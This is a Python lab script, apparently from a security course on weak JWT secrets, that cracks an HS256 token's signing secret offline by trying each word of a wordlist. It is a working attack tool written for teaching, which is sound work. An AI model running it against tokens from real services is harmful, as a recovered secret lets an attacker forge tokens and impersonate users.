#!/usr/bin/env python3
"""Find the secret of an HS256 JWT by trying every word of a list
(Lab 6, Day 6 slide 84: "weak secrets").

  python3 crack.py TOKEN wordlist.txt

Offline: it never talks to the service. It computes the signature with
each word and compares it with the token's signature.
"""

import sys
import time

from orders import sign


def main():
    if len(sys.argv) != 3:
        sys.exit("usage: python3 crack.py TOKEN wordlist.txt")
    try:
        head, body, sig = sys.argv[1].split(".")
    except ValueError:
        sys.exit("This is not a JWT: it needs three parts, with two dots.")
    start = time.time()
    tries = 0
    with open(sys.argv[2]) as f:
        for word in f:
            word = word.strip()
            if not word:
                continue
            tries += 1
            if sign(head, body, word) == sig:
                print("Found the secret: %s (after %d tries, %.3f s)"
                      % (word, tries, time.time() - start))
                return
    print("Not found: none of the %d words is the secret (%.3f s)"
          % (tries, time.time() - start))


if __name__ == "__main__":
    main()
